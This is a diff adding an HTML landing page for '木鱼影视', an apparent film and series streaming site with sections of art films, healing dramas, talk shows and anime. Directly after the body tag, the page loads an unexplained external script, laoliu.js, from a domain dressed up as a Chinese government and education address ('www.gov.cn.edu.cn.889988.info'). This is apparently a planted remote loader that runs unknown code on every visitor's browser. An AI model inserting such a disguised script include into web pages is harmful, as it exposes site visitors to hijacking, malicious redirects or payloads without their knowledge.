@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>木鱼影视 - 静心观影·文艺电影与治愈剧集在线看</title>
+<meta name="description" content="木鱼影视精选文艺电影、治愈剧集、人文综艺与空明动漫，在木鱼声中品味光影。移动端自适应，静心、克制、无干扰的影视单页。">
+<meta name="keywords" content="木鱼影视,静心观影,文艺电影,治愈剧集,人文综艺,空明动漫,影视资源">
+<link rel="canonical" href="https://muyuyingshi-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Serif SC","Songti SC","Source Han Serif SC","STSong",serif;
+  background:#f7f4ee;color:#26241f;line-height:1.95;
+  background-image:radial-gradient(circle at 12% 8%,rgba(120,110,90,.05),transparent 40%),
+    radial-gradient(circle at 88% 92%,rgba(90,100,80,.05),transparent 40%);
+  overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+section[id]{scroll-margin-top:0}
+
+/* 顶栏：细线+文字 */
+.nav{
+  position:sticky;top:0;z-index:999;background:rgba(247,244,238,.86);
+  backdrop-filter:blur(8px);border-bottom:1px solid #e3ddd1;
+}
+.nav-in{max-width:1180px;margin:0 auto;height:62px;padding:0 22px;
+  display:flex;align-items:center;justify-content:space-between;}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .fish{
+  width:34px;height:34px;border:1px solid #9a8f78;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;font-size:18px;color:#7a6f57;
+}
+.logo b{font-size:20px;font-weight:600;letter-spacing:6px;color:#26241f}
+.logo span{font-size:11px;letter-spacing:3px;color:#9a8f78;margin-left:2px}
+.menu{display:flex;gap:6px}
+.menu a{font-size:13px;letter-spacing:2px;color:#6f6757;padding:8px 14px;
+  border-bottom:1px solid transparent;transition:.3s}
+.menu a:hover{color:#a23b34;border-bottom-color:#a23b34}
+
+/* Hero：和纸留白 */
+.hero{
+  max-width:1180px;margin:0 auto;padding:90px 22px 70px;
+  display:grid;grid-template-columns:1.4fr .6fr;gap:40px;align-items:center;
+}
+.hero h1{
+  font-size:clamp(38px,6vw,68px);font-weight:500;line-height:1.25;letter-spacing:4px;
+}
+.hero h1 em{font-style:normal;color:#a23b34}
+.hero .lead{font-size:16px;color:#6f6757;margin:26px 0 30px;max-width:520px}
+.hero .stamp{
+  display:inline-flex;align-items:center;gap:10px;font-size:13px;letter-spacing:3px;color:#7a6f57;
+  border:1px solid #cfc7b6;padding:9px 18px;border-radius:2px;
+}
+.hero .stamp i{width:7px;height:7px;background:#a23b34;display:inline-block;border-radius:1px}
+.hero-side{
+  border-left:1px solid #e3ddd1;padding-left:30px;
+  writing-mode:vertical-rl;text-orientation:mixed;
+  font-size:13px;letter-spacing:6px;color:#9a8f78;height:260px;
+}
+.hero-side b{color:#a23b34;font-weight:500}
+
+/* 诗句条 */
+.haiku{
+  border-top:1px solid #e3ddd1;border-bottom:1px solid #e3ddd1;
+  padding:30px 22px;text-align:center;
+}
+.haiku p{font-size:18px;letter-spacing:5px;color:#3a362e}
+.haiku span{display:block;margin-top:10px;font-size:12px;letter-spacing:3px;color:#9a8f78}
+
+/* 区块 */
+.block{max-width:1180px;margin:0 auto;padding:84px 22px}
+.block-head{display:flex;align-items:baseline;gap:16px;margin-bottom:40px}
+.block-head .jp{font-size:12px;letter-spacing:4px;color:#a23b34}
+.block-head h2{font-size:26px;font-weight:500;letter-spacing:4px}
+.block-head .line{flex:1;height:1px;background:#e3ddd1}
+.block-head a{font-size:12px;letter-spacing:2px;color:#9a8f78}
+.block-head a:hover{color:#a23b34}
+
+/* 静心电影：横向长卷 */
+.film-row{display:grid;grid-template-columns:repeat(4,1fr);gap:26px}
+.film{
+  background:#fbf9f4;border:1px solid #ece6da;padding:12px;
+  transition:.4s;
+}
+.film:hover{transform:translateY(-5px);box-shadow:0 14px 30px rgba(60,55,45,.08);border-color:#d8cfbd}
+.film img{width:100%;height:300px;object-fit:cover;filter:saturate(.85) contrast(.96)}
+.film:hover img{filter:none}
+.film .cap{padding:14px 6px 4px}
+.film h3{font-size:16px;font-weight:600;letter-spacing:2px}
+.film p{font-size:12.5px;color:#8a8170;margin-top:6px}
+.film .rate{margin-top:10px;font-size:12px;color:#a23b34;letter-spacing:2px}
+
+/* 剧集：左右留白行 */
+.series{display:flex;flex-direction:column}
+.series-row{
+  display:grid;grid-template-columns:120px 1fr auto;gap:22px;align-items:center;
+  padding:24px 6px;border-bottom:1px solid #ece6da;transition:.3s;
+}
+.series-row:hover{background:#fbf9f4;padding-left:16px}
+.series-row img{width:120px;height:78px;object-fit:cover}
+.series-row h3{font-size:17px;font-weight:600;letter-spacing:2px}
+.series-row p{font-size:13px;color:#8a8170;margin-top:5px}
+.series-row .ep{font-size:12px;color:#7a6f57;border:1px solid #d8cfbd;padding:5px 12px;letter-spacing:2px}
+
+/* 综艺：枯山水点阵 */
+.zen-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.zen{
+  border:1px solid #ece6da;background:#fbf9f4;padding:30px 26px;position:relative;
+  transition:.35s;
+}
+.zen::before{
+  content:'';position:absolute;top:18px;right:18px;width:10px;height:10px;
+  border:1px solid #cfc7b6;border-radius:50%;
+}
+.zen:hover{border-color:#a23b34;background:#fff}
+.zen .ko{font-size:12px;letter-spacing:4px;color:#a23b34;margin-bottom:12px}
+.zen h3{font-size:17px;font-weight:600;letter-spacing:2px}
+.zen p{font-size:13px;color:#8a8170;margin-top:10px;line-height:1.85}
+
+/* 动漫：圆相 */
+.circle-wrap{display:flex;gap:26px;flex-wrap:wrap;justify-content:center}
+.enso{
+  width:200px;text-align:center;cursor:pointer;
+}
+.enso .ring{
+  width:170px;height:170px;margin:0 auto 16px;border-radius:50%;
+  border:2px solid #26241f;position:relative;overflow:hidden;
+  background:#fbf9f4;transition:.4s;
+}
+.enso .ring img{width:100%;height:100%;object-fit:cover;opacity:.82;transition:.4s}
+.enso:hover .ring{border-color:#a23b34;transform:rotate(6deg)}
+.enso:hover .ring img{opacity:1}
+.enso h3{font-size:15px;font-weight:600;letter-spacing:2px}
+.enso p{font-size:12px;color:#8a8170;margin-top:4px}
+
+/* 关于 */
+.about{
+  display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center;
+  border:1px solid #ece6da;background:#fbf9f4;padding:46px;
+}
+.about h2{font-size:24px;font-weight:500;letter-spacing:4px;margin-bottom:20px}
+.about h2 em{font-style:normal;color:#a23b34}
+.about p{font-size:15px;color:#5f5848;margin-bottom:14px;line-height:2}
+.about .url{color:#a23b34;font-weight:600;letter-spacing:1px}
+.about .seal{
+  justify-self:center;width:150px;height:150px;border:2px solid #a23b34;border-radius:6px;
+  display:flex;align-items:center;justify-content:center;
+  writing-mode:vertical-rl;font-size:30px;letter-spacing:10px;color:#a23b34;font-weight:500;
+}
+
+/* 页脚 */
+.foot{border-top:1px solid #e3ddd1;padding:46px 22px 30px;text-align:center}
+.foot .fish{font-size:22px;letter-spacing:8px;color:#3a362e}
+.foot-links{display:flex;justify-content:center;gap:26px;flex-wrap:wrap;margin:18px 0}
+.foot-links a{font-size:12px;letter-spacing:2px;color:#9a8f78}
+.foot-links a:hover{color:#a23b34}
+.foot p{font-size:12px;color:#b3aa97;letter-spacing:1px}
+
+@media(max-width:860px){
+  .menu{display:none}
+  .hero{grid-template-columns:1fr;padding:60px 20px 50px}
+  .hero-side{display:none}
+  .film-row{grid-template-columns:1fr 1fr;gap:16px}
+  .film img{height:220px}
+  .series-row{grid-template-columns:90px 1fr;gap:14px}
+  .series-row img{width:90px;height:60px}
+  .series-row .ep{display:none}
+  .zen-grid{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr;padding:30px}
+  .about .seal{margin-top:10px}
+  .block{padding:60px 20px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<div class="nav">
+  <div class="nav-in">
+    <div class="logo">
+      <div class="fish">木</div>
+      <b>木鱼影视</b><span>MUYU</span>
+    </div>
+    <nav class="menu">
+      <a href="#home">首页</a>
+      <a href="#film">静心电影</a>
+      <a href="#series">入定剧集</a>
+      <a href="#zen">顿悟综艺</a>
+      <a href="#anime">空明动漫</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div>
+    <h1>木鱼一声<br>光影<em>自静</em></h1>
+    <p class="lead">不追爆款，不堆榜单。木鱼影视只收那些值得慢看的文艺片、治愈剧、人文综艺与空明动漫——在喧嚣里，留一块可以发呆的屏幕。</p>
+    <a href="#film" class="stamp"><i></i> 开始静心观影</a>
+  </div>
+  <div class="hero-side">
+    一叶一菩提 · <b>一帧一世界</b>
+  </div>
+</section>
+
+<!-- 诗句 -->
+<div class="haiku">
+  <p>镜中花未落，屏上山犹青</p>
+  <span>—— 木鱼影视 · 静心片库</span>
+</div>
+
+<!-- 静心电影 -->
+<section class="block" id="film">
+  <div class="block-head">
+    <span class="jp">映画</span>
+    <h2>静心电影</h2>
+    <span class="line"></span>
+    <a href="#">全部 #</a>
+  </div>
+  <div class="film-row">
+    <div class="film">
+      <img src="https://picsum.photos/400/560?random=901" alt="木鱼影视 步履不停">
+      <div class="cap"><h3>步履不停</h3><p>家庭 / 2008 / 是枝裕和</p><div class="rate">★ 9.0 · 4K修复</div></div>
+    </div>
+    <div class="film">
+      <img src="https://picsum.photos/400/560?random=902" alt="木鱼影视 海街日记">
+      <div class="cap"><h3>海街日记</h3><p>剧情 / 2015 / 是枝裕和</p><div class="rate">★ 8.8 · 治愈</div></div>
+    </div>
+    <div class="film">
+      <img src="https://picsum.photos/400/560?random=903" alt="木鱼影视 东京物语">
+      <div class="cap"><h3>东京物语</h3><p>家庭 / 1953 / 小津安二郎</p><div class="rate">★ 9.2 · 经典</div></div>
+    </div>
+    <div class="film">
+      <img src="https://picsum.photos/400/560?random=904" alt="木鱼影视 人生果实">
+      <div class="cap"><h3>人生果实</h3><p>纪录 / 2017 / 伏原健之</p><div class="rate">★ 8.9 · 慢生活</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 入定剧集 -->
+<section class="block" id="series" style="background:#f1ede4">
+  <div class="block-head">
+    <span class="jp">連続劇</span>
+    <h2>入定剧集</h2>
+    <span class="line"></span>
+    <a href="#">全部 #</a>
+  </div>
+  <div class="series">
+    <div class="series-row">
+      <img src="https://picsum.photos/240/160?random=911" alt="木鱼影视 去有风的地方">
+      <div><h3>去有风的地方</h3><p>田园治愈 / 2023 / 刘亦菲 · 大理的风、云、饭与猫</p></div>
+      <span class="ep">全40集</span>
+    </div>
+    <div class="series-row">
+      <img src="https://picsum.photos/240/160?random=912" alt="木鱼影视 我们由奇迹构成">
+      <div><h3>我们由奇迹构成</h3><p>日剧 / 2018 / 高桥一生 · 生物老师与海边小镇</p></div>
+      <span class="ep">全10集</span>
+    </div>
+    <div class="series-row">
+      <img src="https://picsum.photos/240/160?random=913" alt="木鱼影视 我的解放日志">
+      <div><h3>我的解放日志</h3><p>韩剧 / 2022 / 李民基 · 通勤路上的精神出走</p></div>
+      <span class="ep">全16集</span>
+    </div>
+    <div class="series-row">
+      <img src="https://picsum.photos/240/160?random=914" alt="木鱼影视 万物生灵">
+      <div><h3>万物生灵</h3><p>英剧 / 2020 / 约克郡山谷里的兽医日常</p></div>
+      <span class="ep">全4季</span>
+    </div>
+  </div>
+</section>
+
+<!-- 顿悟综艺 -->
+<section class="block" id="zen">
+  <div class="block-head">
+    <span class="jp">対談</span>
+    <h2>顿悟综艺</h2>
+    <span class="line"></span>
+    <a href="#">全部 #</a>
+  </div>
+  <div class="zen-grid">
+    <div class="zen">
+      <div class="ko">其一</div>
+      <h3>十三邀</h3>
+      <p>许知远与十三位受访者的长谈。不急着结论，让观点在停顿里自己长出来。</p>
+    </div>
+    <div class="zen">
+      <div class="ko">其二</div>
+      <h3>局部</h3>
+      <p>陈丹青讲艺术里的“偏旁部首”——那些被美术史忽略的角落，才是真趣味。</p>
+    </div>
+    <div class="zen">
+      <div class="ko">其三</div>
+      <h3>圆桌派</h3>
+      <p>一壶茶、几个人、一堆闲话。文化不是学问，是说话的方式与分寸。</p>
+    </div>
+    <div class="zen">
+      <div class="ko">其四</div>
+      <h3>书房里的世界观</h3>
+      <p>读书人聊书外之事：时间、故乡、死亡与一碗面，知识落回生活才生根。</p>
+    </div>
+    <div class="zen">
+      <div class="ko">其五</div>
+      <h3>一路书香</h3>
+      <p>把书带到它该在的地方：沙漠、古镇、渡口、旧书店，文字和风土互相照亮。</p>
+    </div>
+    <div class="zen">
+      <div class="ko">其六</div>
+      <h3>一日禅</h3>
+      <p>扫地、煮水、行脚、坐香。一天不刷信息，把注意力还给自己。</p>
+    </div>
+  </div>
+</section>
+
+<!-- 空明动漫 -->
+<section class="block" id="anime" style="background:#f1ede4">
+  <div class="block-head">
+    <span class="jp">動畫</span>
+    <h2>空明动漫</h2>
+    <span class="line"></span>
+    <a href="#">全部 #</a>
+  </div>
+  <div class="circle-wrap">
+    <div class="enso">
+      <div class="ring"><img src="https://picsum.photos/300/300?random=921" alt="木鱼影视 千与千寻"></div>
+      <h3>千与千寻</h3><p>吉卜力 / 2001</p>
+    </div>
+    <div class="enso">
+      <div class="ring"><img src="https://picsum.photos/300/300?random=922" alt="木鱼影视 夏目友人帐"></div>
+      <h3>夏目友人帐</h3><p>治愈 / 2008</p>
+    </div>
+    <div class="enso">
+      <div class="ring"><img src="https://picsum.photos/300/300?random=923" alt="木鱼影视 虫师"></div>
+      <h3>虫师</h3><p>奇幻 / 2005</p>
+    </div>
+    <div class="enso">
+      <div class="ring"><img src="https://picsum.photos/300/300?random=924" alt="木鱼影视 龙猫"></div>
+      <h3>龙猫</h3><p>吉卜力 / 1988</p>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="block" id="about">
+  <div class="about">
+    <div>
+      <h2>木鱼影视<em>是什么</em></h2>
+      <p>不是又一个“全网资源站”。木鱼影视只做减法：删掉弹窗、删掉焦虑榜单、删掉“再不看就亏了”的话术，把屏幕还给作品本身。</p>
+      <p>这里收文艺电影、慢剧、人文对谈、吉卜力与日常系动漫。适合晚上十点后，关灯，泡茶，不倍速。</p>
+      <p>官方网址：<span class="url">https://muyuyingshi-h5.github.io</span></p>
+    </div>
+    <div class="seal">木鱼影视</div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="foot">
+  <div class="fish">木 鱼 影 视</div>
+  <div class="foot-links">
+    <a href="#film">静心电影</a>
+    <a href="#series">入定剧集</a>
+    <a href="#zen">顿悟综艺</a>
+    <a href="#anime">空明动漫</a>
+    <a href="#about">关于</a>
+  </div>
+  <p>© 2024 木鱼影视 · 网站网址：https://muyuyingshi-h5.github.io · 在木鱼声中，慢慢看</p>
+</footer>
+
+</body>
+</html>
